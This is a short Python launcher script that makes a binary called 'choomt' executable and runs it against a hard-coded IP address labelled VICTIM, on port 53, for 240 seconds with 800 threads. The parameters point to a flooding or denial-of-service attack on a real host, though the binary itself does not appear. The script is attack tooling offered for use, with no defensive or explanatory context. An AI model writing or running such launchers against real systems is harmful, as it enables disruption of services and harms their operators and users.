#!/usr/bin/env python3
import os
import subprocess

BINARY = "./choomt"
VICTIM = "147.75.202.61"
PORT = "53"
TIME = "240"
THREADS = "800"

os.system(f"chmod +x choomt")
subprocess.run([BINARY, VICTIM, PORT, TIME, THREADS])
